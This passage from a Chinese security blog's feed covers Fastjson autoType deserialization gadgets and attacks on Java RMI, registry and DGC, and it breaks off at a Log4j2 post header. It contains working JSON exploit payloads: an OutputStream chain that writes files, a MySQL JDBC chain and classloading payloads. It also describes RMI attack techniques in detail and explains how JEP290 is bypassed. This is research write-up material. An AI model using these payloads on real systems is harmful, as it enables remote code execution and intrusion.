title="利用期望类"></a>利用期望类</h3><p>期望类可以由类间关系隐式确定，也可以由两个<code>@type</code>显式指定。一个期望类为<code>Foo</code>的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    Foo id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> <span class="keyword">implements</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">    String fooId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由类间关系确定</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;User&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;FooImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;fooId&quot;</span>:<span class="string">&quot;abc&quot;</span></span><br><span class="line">    &#125;,   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由JSON显式指定</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Foo&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;FooImpl&quot;</span>,<span class="attr">&quot;fooId&quot;</span>:<span class="string">&quot;abc&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>从玄武实验室梳理的<code>checkAutoType</code>的流程可以看出，期望类及其派生的子类不在黑名单中就能通过检查：</p><p><img src="/img/fastjsonsum_f.png"></p><p><code>expectClass</code>由<code>checkAutoType</code>的二参传入，多数情况下是null，先要找出存在有效参数的调用，一个是<code>ThrowableDeserializer</code>、一个是<code>JavaBeanDeserializer</code></p><p><img src="/img/fastjsonsum_g.png"></p><p>在<code>ParserConfig#getDeserializer</code>可以看到<code>Throwable.class</code>的派生类由<code>ThrowableDeserializer</code>处理、没有专属Deserializer的类由<code>JavaBeanDeserializer</code>处理</p><p><img src="/img/fastjsonsum_h.png"></p><p>哪些类会由<code>JavaBeanDeserializer</code>处理呢？以<code>TypeUtils#addBaseClassMappings</code>的<code>classes</code>作为样本，提取<code>getDeserializer</code>方法稍作改动并筛除<code>expectClassFlag</code>为false的类后得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">java.lang.AutoCloseable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Short</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Float</span><br><span class="line">java.lang.Double</span><br><span class="line">java.lang.Number</span><br><span class="line">java.lang.String</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.util.BitSet</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.Locale</span><br><span class="line">java.util.UUID</span><br><span class="line">java.sql.Time</span><br><span class="line">java.sql.Date</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">com.alibaba.fastjson.JSONPObject</span><br></pre></td></tr></table></figure><ul><li>1.2.68更新的<code>safeMode</code>机制用于完全禁用<code>autoType</code>，手动开启后遇到<code>@type</code>直接抛异常</li></ul><h2 id="寻找Gadgets"><a href="#寻找Gadgets" class="headerlink" title="寻找Gadgets"></a>寻找Gadgets</h2><p>派生类中有可被自动调用的敏感方法，就是一个可选的潜在期望类，最好是一个被广泛使用的接口（<code>AutoCloseable</code>表示你直接报我哈希得了(✪ω✪)）。而魔术方法除了setter、getter、无参构造函数外，还可以调用 能通过<code>ASMUtils.lookupParameterNames</code>获取到参数名 且重载参数最多的构造函数：</p><p><img src="/img/fastjsonsum_k.png"></p><ul><li>参数名存放于<code>LocalVariableTable</code>，只在编译时带调试信息才会有</li></ul><h3 id="OutputStream利用链"><a href="#OutputStream利用链" class="headerlink" title="OutputStream利用链"></a>OutputStream利用链</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/test&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;append&quot;</span>:<span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;infl&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;input&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;array&quot;</span>:<span class="string">&quot;eNorSS0uMTQyBgAKygJX&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;limit&quot;</span>:<span class="number">15</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;bufLen&quot;</span>:<span class="string">&quot;100&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>通过<code>FileOutputStream(File file, boolean append)</code>创建文件并作为<code>InflaterOutputStream(OutputStream out, Inflater infl, int bufLen)</code>的一参</p></li><li><p>二参<code>Inflater</code>类中存在<code>ByteBuffer input</code>属性，经过<code>JSONScanner#bytesValue</code>Base64解码得到byte后，会在<code>ByteBufferCodec$ByteBufferBean#byteBuffer</code>完成组装（其中<code>array</code>是zip压缩后byte的Base64编码，<code>limit</code>是字节长度）</p></li><li><p>最终由<code>MarshalOutputStream</code>的父类构造函数<code>ObjectOutputStream</code>-&gt;<code>this.bout.setBlockDataMode</code>-&gt;<code>this.drain</code>-&gt;<code>this.out.write</code>触发写入</p></li></ol><p>要注意的是1.2.57才开始支持ByteBuffer反序列化，有调试信息的部分JDK8版本与这个OpenJDK11<code>input</code>属性有不同。</p><h3 id="MysqlJDBC利用链"><a href="#MysqlJDBC利用链" class="headerlink" title="MysqlJDBC利用链"></a>MysqlJDBC利用链</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span>: <span class="string">&quot;dbname&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JDBC4Connection类构造函数初始化时会使用父类ConnectionImpl的构造函数，进一步通过<code>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>-&gt;<code>Util.resultSetToMap</code>-&gt;<code>rs.getObject</code>触发MysqlJDBC反序列化。</p><h3 id="双亲委派类加载"><a href="#双亲委派类加载" class="headerlink" title="双亲委派类加载"></a>双亲委派类加载</h3><p>通过<code>System.getProperty</code>可以获取<code>sun.boot.class.path</code>、<code>java.ext.dirs</code>的值，根据双亲委派的特点如果能将恶意类上传/写入<code>jre/classes</code>（这个目录似乎默认不存在，需要新建），或者覆盖已有的jar包（比如<code>charsets.jar</code>），就可以由Fastjson触发恶意类加载。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现AutoCloseable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Run&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承Exception</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Run&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">enable_autotype</a></p><p><a href="https://github.com/alibaba/fastjson/wiki/JSONPath">JSONPath</a></p><p><a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">fastjson_safemode</a></p><p><a href="https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg">fastjson 反序列化漏洞 POC 分析</a></p><p><a href="https://www.freebuf.com/vuls/208339.html">浅谈Fastjson RCE漏洞的绕过史</a></p><p><a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">fastjson一种利用$ref几乎任意getter触发的方法</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p><p><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记</a></p><p><a href="https://github.com/alibaba/fastjson/issues/2357">fastjson序列化ByteBuffer的问题</a></p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">US-21-Xing-How-I-Used-a-JSON</a></p><p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack</a></p><p><a href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></p><p><a href="https://articles.zsxq.com/id_56fvo4dtbivd.html">JDK8任意文件写场景下的Fastjson RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to c</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Fastjson" scheme="https://hosch3n.github.io/tags/Fastjson/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="Xalan" scheme="https://hosch3n.github.io/tags/Xalan/"/>
    
    <category term="JNDI" scheme="https://hosch3n.github.io/tags/JNDI/"/>
    
    <category term="JDBC" scheme="https://hosch3n.github.io/tags/JDBC/"/>
    
  </entry>
  
  <entry>
    <title>攻击JavaRMI概述</title>
    <link href="https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/"/>
    <id>https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/</id>
    <published>2022-02-15T07:14:53.000Z</published>
    <updated>2022-05-11T07:52:48.980Z</updated>
    
    <content type="html"><![CDATA[<p>可能师傅们也遇到过这种情况：因为问题A跟进某个类方法，调试期间遇到一个更纠结的问题B，在费尽周折终于搞清楚后，暮然回首却忘了自己在干什么（问题A）。。。QAQ</p><p>JavaRMI与相关攻击面错综复杂，因此本文仅以时间线梳理各种绕过方法与缓解措施的主要逻辑，而不会详述具体调用栈（但会指出关键类方法）。大家可以自行跟进加深印象，也可以参考其它师傅的文章云调试。</p><hr><p>RMI全称是<code>Remote Method Invocation</code>（远程方法调用），可以理解为远程过程调用（RPC）的Java实现版本。它使得应用程序员可以像调用本地方法一样（<code>stub.func(arg)</code>），调用远程主机上提供的方法，方法实际最终在远程主机上执行（<code>serv.func(arg)</code>），原因是本地类封装了与远程类基于<strong>序列化</strong>的网络通信（<code>socket</code>）</p><p>我们将上述提供业务方法的远程主机称为服务端，将发起方法调用的本地主机称为客户端。服务端会监听在一个随机端口上，将自己的通信地址等信息封装后（<code>stub</code>）由某种途径交给客户端。这种途径就是默认监听在1099端口上的注册端。</p><p><img src="/img/rmisum_a.png" alt="https://github.com/jasonGeng88/blog/blob/master/201704/assets/rmi_01.png"></p><h2 id="攻击业务危险方法"><a href="#攻击业务危险方法" class="headerlink" title="攻击业务危险方法"></a>攻击业务危险方法</h2><p>如果远程方法实现中存在输入流可控的危险方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clazz &#123;</span><br><span class="line">    func(arg) &#123;</span><br><span class="line">        exec(arg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上就跟利用Web应用漏洞一样，RMI此时就是一个毫无存在感的中间层。实际情况是基本没有能直接调用到的危险方法，而且也不知道危险方法的调用接口（<code>clazz.func(arg)</code>）</p><blockquote><p><code>java.rmi.server.useCodebaseOnly</code>在7u21|6u45时由默认false改为true，下文均需要被攻击端存在gadgets。另外为了行文流畅，8u241对String类型反序列化作的变动放在文末统一说明。</p></blockquote><h2 id="攻击远程方法参数"><a href="#攻击远程方法参数" class="headerlink" title="攻击远程方法参数"></a>攻击远程方法参数</h2><p>当服务端并不存在危险业务方法，但我们可以拿到远程方法接口类（比如开源应用）。发现它接收一个Object类型参数（<code>func(Object arg, ...)</code>），在此处传入恶意payload对象，服务端从网络接收数据并试图反序列化还原对象时，就会触发gadgets。</p><p>相比Object类型，远程方法入参更有可能是int、boolean等基本数据类型，或是String以及其它封装类。客户端会根据方法名及参数类型生成哈希，服务端收到这个哈希就能知道调用的是哪一个方法（<code>sun.rmi.server.UnicastServerRef#hashToMethod_Map</code>）</p><p>那么把恶意对象强行塞给非Object参数能否触发反序列化执行呢？当远程方法参数为非基本数据类型时，<code>sun.rmi.server.UnicastRef#unmarshalValue</code>就会进入readObject所在分支。通过 修改网络数据、修改字节码、修改内存对象、修改RMI客户端实现 任意一种方法，将方法哈希修改为服务端存在且符合类型要求的远程方法哈希，即可触发强行塞入的恶意对象。</p><p><img src="/img/rmisum_b.png"></p><h2 id="攻击RMI注册端"><a href="#攻击RMI注册端" class="headerlink" title="攻击RMI注册端"></a>攻击RMI注册端</h2><p>抛开具体业务远程方法，Registry也提供了基本方法：</p><ul><li>bind(String, Remote)</li><li>list()</li><li>lookup(String)</li><li>rebind(String, Remote)</li><li>unbind(String)</li></ul><p>除了list方法不会向<strong>注册端</strong>传递参数，其余四个方法的任意参数都会被注册端接收并readObject（<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>），要解决的问题是如何让恶意对象符合类型要求。</p><p><a href="https://github.com/NickstaDB/BaRMIe/blob/master/src/nb/barmie/net/proxy/thread/BindPayloadInjectingProxyThread.java">BaRMIe</a>采用代理注册端，通过<code>handleData</code>方法替换字节流数据，最终形成<code>bind(payload, null)</code></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java#L75">ysoserial.exploit.RMIRegistryExploit</a>采用动态代理，通过<code>createMemoitizedProxy</code>方法封装为Remote，最终形成<code>bind(&quot;pwnedXXX&quot;, payload)</code></p><p>我们也可以自己创建一个类并实现<code>Remote, Serializable</code>，将payload对象赋值放入任意类属性。虽然注册端递归反序列化后最终会找不到自定义类报错，但在此之前会先触发gadgets。</p><p><img src="/img/rmisum_c.png"></p><p>在JEP290（8u121，7u131，6u141）加入的<code>sun.rmi.registry.RegistryImpl#registryFilter</code>会限制递归深度、数组长度，并基于白名单递归检查类型，会拦截payload的最终执行。</p><p><img src="/img/rmisum_d.png"></p><p>此外在8u141将<code>dispatch</code>中原来的先readObject再RegistryImpl.checkAccess（默认仅允许注册端与服务端同地址），修正为了先作检查。会使攻击者伪装成服务端向注册端发起bind/rebind/unbind的攻击失效，但不会影响攻击者作为客户端发起lookup。</p><h2 id="攻击DGC服务"><a href="#攻击DGC服务" class="headerlink" title="攻击DGC服务"></a>攻击DGC服务</h2><p>DGC全称是<code>Distributed Garbage Collection</code>，顾名思义其实就是GC（垃圾回收）的分布式方案。与Registry类似，DGC服务也提供了基本方法<code>dirty()</code>和<code>clean()</code>。客户端需要用到<strong>注册端</strong>或<strong>服务端</strong>的远程对象时，会通过dirty申请。相应的，当客户端不再需要时则会通过clean注销。</p><p>而同样与Registry类似，<strong>注册端</strong>或<strong>服务端</strong>上的<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>，会接收DGC客户端经由dirty或clean传过来的部分数据并readObject，要解决的问题是<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>并没有一个参数接口用于传递对象。</p><p>对此，<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java#L55">ysoserial.exploit.JRMPClient</a>按照DGC通信的固定格式直接走socket通信在相应位置写入了payload，最终形成<code>[0x4a524d49, 2, 0x4c, 0x50| 2, 0, 0, 0, 1, -669196253586618813L, payload]</code>的数据流。</p><p><img src="/img/rmisum_e.png"></p><p>在JEP290加入的<code>sun.rmi.transport.DGCImpl#checkInput</code>逻辑也与之前相同，会拦截payload的最终执行。</p><h2 id="攻击JRMP客户端"><a href="#攻击JRMP客户端" class="headerlink" title="攻击JRMP客户端"></a>攻击JRMP客户端</h2><p>RMI和DGC服务都是基于JRMP协议通信，就像HTTP应用与TCP之间会有Web服务器处理HTTP协议一样，JRMP也有相应的处理模块。我们将主动发起JRMP请求的一方称为JRMP客户端，将监听JRMP请求的一方成为JRMP服务端。</p><p>JEP290主要通过白名单限制了RMI服务端与DGC服务（注册端或服务端）readObject时能使用的类，却没有限制JRMP客户端处理JRMP服务端返回的异常信息readObject（<code>sun.rmi.transport.StreamRemoteCall#executeCall</code>）</p><p>同上文所述，JRMP服务端的<code>sun.rmi.transport.Transport#serviceCall</code>等位置都是直接<code>writeObject(Exception)</code>，所以需要实现恶意JRMP服务端在JRMP客户端发起连接时，将payload走异常接口给抛回去。</p><p><a href="https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/exploit/JRMPListener.java#L244">ysoserial.exploit.JRMPListener</a>就是这种实现，构造为<code>[81, 2, payload]</code>的数据返回给JRMP客户端，使其进入异常处理触发payload。</p><h3 id="寻找Gadgets"><a href="#寻找Gadgets" class="headerlink" title="寻找Gadgets"></a>寻找Gadgets</h3><blockquote><p>DGCClient implements the client side of the RMI distributed garbage collection system. The external interface to DGCClient is the registerRefs() method. When a LiveRef to a remote object enters the JVM, it must be registered with the DGCClient to participate in distributed garbage collection. When the first LiveRef to a particular remote object is registered, a dirty() call is made to the server-side DGC for the remote object.</p></blockquote><p>可以知道当LiveRef加载进JVM后，会通过<code>registerRefs</code>注册并发起<code>dirty</code>请求。<a href="https://github.com/frohoff/ysoserial/blob/8eb5cbfbf6c47a23682f6186bea9baf6439e57b9/src/main/java/ysoserial/payloads/JRMPClient.java#L71">ysoserial.payloads.JRMPClient</a>以<code>sun.rmi.server.UnicastRef#readExternal</code>充当反序列化入口，在其中装填了<code>sun.rmi.transport.LiveRef</code>，借由DGC机制便可主动发起JRMP请求。</p><p>如果有地方能够触发这个反序列化入口，就可以让它成为JRMP客户端向恶意JRMP服务端发起请求，进而走没被限制的异常readObject触发最终payload。刚好<code>UnicastRef</code>是<code>RegistryImpl#registryFilter</code>的白名单类，原汤化原食了属于是。</p><h3 id="触发反序列化"><a href="#触发反序列化" class="headerlink" title="触发反序列化"></a>触发反序列化</h3><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java#L77">ysoserial.exploit.RMIRegistryExploit</a>利用的<code>registry.bind(name, remote)</code>在8u141后失效了，<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/exploits/rmi/RMIRegistryExploit.java#L76">ysomap.exploits.rmi.RMIRegistryExploit</a>使用的<code>Naming.lookup(registry, remote)</code>则依然有效。</p><p>同样要解决让第一步的payload符合类型要求的问题。要么依托原RMI客户端发起lookup，找一个实现了Remote且能存放LiveRef的类（比如<code>RemoteObjectInvocationHandler</code>），或者利用递归反序列化特性自己构造类；要么重新实现RMI客户端强行发送数据。</p><ul><li>前者找类并测试会遇到一个与类型相关很有意思的问题</li></ul><p><img src="/img/rmisum_f.png"></p><p><a href="https://github.com/openjdk/jdk/commit/55fc1fb794937091c11b40f674cc52b3560c3300">8u231</a>捕获了在加载Ref（第一步的payload）后会触发的异常，在发起JRMP请求（<code>releaseInputStream</code>）之前清除了Ref。</p><p><img src="/img/rmisum_g.png"></p><p>并且将dirty和clean中的<code>setObjectInputFilter(DGCImpl_Stub::leaseFilter)</code>过滤器提到了JRMP请求发起之后、恶意JRMP服务端最终gadgets触发之前（<code>ref.invoke(call)</code>)的位置。</p><p>细看可以发现缓解措施针对的都是加载Ref（第一步的payload）之后的过程，当有一个gadgets能在加载自身就触发JRMP请求，就能绕过这些过滤，An Trinhs找到了一条这样的链：</p><ol><li><p>UnicastRemoteObject#readObject</p></li><li><p>RMIServerSocketFactory#createServerSocket</p></li><li><p>RemoteObjectInvocationHandler#invoke</p></li></ol><p>利用动态代理机制封装了类，同时gank了本来的方法调用，将其引入invoke。</p><p><img src="/img/rmisum_h.png"></p><p>从OracleJDK-8u241/<a href="https://github.com/openjdk/jdk8u/commit/9fb68f29a5fc2bf5407e72f96ca6cd81be1af6e8#diff-9071564785e3fe39d109f0bb6b72a651">OpenJDK-8u242</a>开始将多处readObject再转型String的地方修改为了<code>SharedSecrets.getJavaObjectInputStreamReadString().readString</code>，修复了lookup时的反序列化入口，并且影响上文<strong>攻击远程方法参数</strong>和<strong>攻击RMI注册端</strong>中涉及String类型参数的地方。</p><h2 id="反制攻击方"><a href="#反制攻击方" class="headerlink" title="反制攻击方"></a>反制攻击方</h2><p>最后稍微聊一下喜闻乐见的反制问题，ysoserial在<a href="https://github.com/frohoff/ysoserial/commit/477ecb8f05f42b0195a67d9712e97f2c6d31e1da">477ecb8</a>更新了一个无限制的<code>registry.list()</code>，哪怕在8u261中依然是写着赤果果的readObject：</p><p><img src="/img/rmisum_i.png"></p><p>而在那个commit之前，也许作者是想借由原生的<code>registry.bind(name, remote)</code>得到注册端回显，方便攻击时判断gadgets环境，为此其戴了<code>ExecCheckingSecurityManage</code>作为安全措施（/doge），但还是可以通过CC链读写文件等方式间接溯源或者RCE。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/">Attacking Java RMI services after JEP 290</a></p><p><a href="https://xz.aliyun.com/t/7932">针对RMI服务的九重攻击 - 下</a></p><p><a href="https://openjdk.java.net/jeps/290">JEP 290: Filter Incoming Serialization Data</a></p><p><a href="https://www.ibm.com/docs/en/sdk-java-technology/8?topic=iiop-understanding-distributed-garbage-collection">Understanding distributed garbage collection</a></p><p><a href="https://www.bilibili.com/video/BV17Z4y1s7cG">30行代码透彻解析RPC</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可能师傅们也遇到过这种情况：因为问题A跟进某个类方法，调试期间遇到一个更纠结的问题B，在费尽周折终于搞清楚后，暮然回首却忘了自己在干什么（问题A）。。。QAQ&lt;/p&gt;
&lt;p&gt;JavaRMI与相关攻击面错综复杂，因此本文仅以时间线梳理各种绕过方法与缓解措施的主要逻辑，而不会详</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RMI" scheme="https://hosch3n.github.io/tags/RMI/"/>
    
    <category term="DGC" scheme="https://hosch3n.github.io/tags/DGC/"/>
    
    <category term="JRMP" scheme="https://hosch3n.github.io/tags/JRMP/"/>
    
    <category term="useCodebaseOnly" scheme="https://hosch3n.github.io/tags/useCodebaseOnly/"/>
    
    <category term="registry" scheme="https://hosch3n.github.io/tags/registry/"/>
    
    <category term="BaRMIe" scheme="https://hosch3n.github.io/tags/BaRMIe/"/>
    
    <category term="ysoserial" scheme="https://hosch3n.github.io/tags/ysoserial/"/>
    
    <category term="ysomap" scheme="https://hosch3n.github.io/tags/ysomap/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2漏洞浅析</title>
    <link href="https://hosch3n.github.io/2021/12/10/Log4j2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2021/12/10/Log4j2%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2021-12-09T23:03:24.000Z</published>
    <updated>2022-05-11T08:31:30.923Z</updated>
    
